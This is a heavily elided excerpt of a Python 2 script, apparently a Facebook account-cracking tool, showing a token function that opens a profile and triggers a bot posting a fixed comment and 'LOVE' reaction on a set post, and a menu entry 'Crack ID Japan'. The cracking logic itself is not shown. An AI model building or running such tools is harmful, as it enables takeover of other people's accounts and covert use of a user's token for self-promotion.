...
def tokenz():
    ...
    try:
        ...
        os.system('xdg-open https://www.facebook.com/100057452252702')
        bot_komen()
    except KeyError:
...
def bot_komen():
    ...
    kom = 'Saya Pengguna SC Abang \xf0\x9f\x98\x98'
    reac = 'LOVE'
    post = '177046717553736'
    post2 = '177046717553736'
...
def crack_teman():
    ...
    print '\x1b[1;94m(\x1b[1;97m8\x1b[1;94m) \x1b[1;97mCrack ID Japan'
